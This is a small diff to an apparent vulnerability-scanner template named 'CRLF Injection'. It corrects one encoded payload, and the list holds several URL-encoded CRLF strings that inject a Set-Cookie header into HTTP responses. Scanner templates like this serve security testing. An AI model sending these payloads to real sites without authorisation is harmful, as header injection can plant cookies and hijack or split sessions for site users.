@@ -5,7 +5,7 @@ info:
   name: CRLF Injection
   risk: High
 payloads:
-  - "%%0a0aSet-Cookie:crlf=injection"
+  - "%0a0aSet-Cookie:crlf=injection"
   - "%0aSet-Cookie:crlf=injection"
   - "%0d%0aSet-Cookie:crlf=injection"
   - "%0dSet-Cookie:crlf=injection"
